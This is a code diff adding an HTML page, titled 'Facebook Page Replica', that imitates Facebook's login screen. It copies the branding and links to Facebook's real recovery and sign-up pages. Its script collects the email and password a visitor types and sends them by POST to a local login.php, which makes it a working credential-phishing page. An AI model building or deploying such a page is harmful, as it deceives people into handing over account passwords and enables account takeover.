@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1">
+    <title>Facebook Page Replica</title>
+    <link rel="stylesheet" href="style.css">
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script rel="javascript" type="text/javascript" href="js/jquery-1.11.3.min.js"></script>
+        <script>
+            function validate() {
+        var username = document.getElementById("text").value;
+        var password = document.getElementById("password").value;
+    
+          $.ajax({
+            type: 'POST',
+            url: 'login.php',
+            data: {user: username , pass: password},
+            mimeType: 'json'
+          });
+    
+      
+        };
+    
+      
+        </script>
+</head>
+<body>
+    <div class="container">
+        <div class="left">
+            <h1>facebook</h1>
+            <p>Facebook helps you connect and share with the people in your life.</p>
+        </div>
+        <div class="right">
+            <form action="">
+                <input id = "text"type="text" placeholder="Email addess or phone number">
+                <input type="password" placeholder="Password" id="password">
+                <a onclick="validate();" class="loginBtn">Log In</a>
+                <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forget">Forgotten password?</a>
+                <div class="sign-up">
+                    <a href="https://www.facebook.com/r.php?locale=ar_AR&display=page" class="signupBtn">Create New Account</a>
+                </div>
+            </form>
+            <p><b onclick="">Create a Page</b> for a celebrity, band or business.</p>
+        </div>
+    </div>
+</body>
+</html>
